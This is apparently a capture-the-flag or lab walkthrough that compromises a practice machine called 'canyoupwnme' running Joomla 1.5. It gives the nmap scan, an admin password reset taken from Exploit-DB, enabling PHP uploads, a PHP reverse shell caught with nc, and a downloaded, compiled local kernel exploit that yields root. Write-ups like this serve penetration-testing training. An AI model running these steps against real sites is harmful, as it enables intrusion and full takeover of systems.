# Exploiting Joomla

## Port scanning

Let's scan the target machine (`canyoupwnme`) with `nmap`

    $ nmap -A -T4 -sT -p1-65535 canyoupwnme
    ...
    8081/tcp  open  http        Apache httpd 2.4.7 ((Ubuntu))
    |_http-generator: Joomla! 1.5 - Open Source Content Management
    | http-methods:
    |_  Supported Methods: GET HEAD POST OPTIONS
    | http-robots.txt: 14 disallowed entries
    | /administrator/ /cache/ /components/ /images/
    | /includes/ /installation/ /language/ /libraries/ /media/
    |_/modules/ /plugins/ /templates/ /tmp/ /xmlrpc/
    |_http-server-header: Apache/2.4.7 (Ubuntu)
    |_http-title: Welcome to the Frontpage
    ...

Seems that Jooma v1.5 is up and running...

## Let's go Googling...

After few seconds I found this one

    https://www.exploit-db.com/exploits/6234

and it worked! The new credentials are

    admin : admin

## Prepare the target machine

Joomla supports media uploading, so we can use this feature to upload a
reverse shell. The first step is to enable the `php` extension as "safe"
content. On the Joomla management interface, go to

    Site > Global Configuration > System > Media Settings

and append `php` to the extensions list.

## Prepare the reverse shell

On the attacker machine, prepare the "magic" PHP file

    $ wget http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz
    $ tar zxvf php-reverse-shell-1.0.tar.gz
    $ cd php-reverse-shell-1.0/
    $ vim php-reverse-shell.php # set IP and PORT (1234)
    $ mv php-reverse-shell.php magic.php

and start listening

    $ nc -lnvp 1234
    listening on [any] 1234 ...

## Upload the shell

On the Joomla management interface, go to

    Site > Media Manager

and upload the `magic.php` file. Then, go to

    http://canyoupwnme:8081/images/magic.php

You should see something interesting on your terminal with `nc`...

    $ nc -lnvp 1234
    listening on [any] 1234 ...

    connect to [10.0.100.245] from canyoupwnme.pentest [10.0.100.195] 54878
    Linux canyoupwnme 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux
    ...

## Becoming `root`

On the attacker machine, spawn a new `tty` shell

    $ python -c "import pty; pty.spawn('/bin/bash');"
    www-data@canyoupwnme:/$

Download, build and execute the local exploit

    www-data@canyoupwnme:/$ cd /tmp
    www-data@canyoupwnme:/tmp$ mkdir ofs && cd ofs
    www-data@canyoupwnme:/tmp$ cd ofs
    www-data@canyoupwnme:/tmp/ofs$ wget https://www.exploit-db.com/download/39166 -O ofs.c
    www-data@canyoupwnme:/tmp/ofs$ gcc ofs.c
    www-data@canyoupwnme:/tmp/ofs$ ./a.out
    root@canyoupwnme:/tmp/ofs# id
    uid=0(root) gid=33(www-data) groups=0(root),33(www-data)

Got it!
